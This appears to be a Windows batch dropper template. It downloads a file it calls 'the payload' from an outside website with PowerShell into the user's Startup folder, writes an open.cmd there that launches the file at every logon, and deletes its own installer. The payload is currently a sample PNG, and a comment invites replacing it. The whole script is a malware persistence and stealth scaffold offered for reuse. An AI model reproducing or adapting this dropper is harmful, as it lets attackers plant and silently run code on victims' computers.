@echo off
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM 1. Create testing.txt in Startup folder
echo This is a test file. > "%startupFolder%\testing.txt"

REM 2. Download the payload and Name it
powershell -Command "Invoke-WebRequest -Uri 'https://freetestdata.com/wp-content/uploads/2021/09/500kb.png' -OutFile '%startupFolder%\image.png'"

REM 3. Create open.cmd to run the payload
(
echo @echo off
echo set "startupFolder=%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup"
echo start "" "%%startupFolder%%\image.png"
REM change Payload file name
) > "%startupFolder%\open.cmd"

REM 4. Self delete installer file
start "" cmd /c del "%~f0"
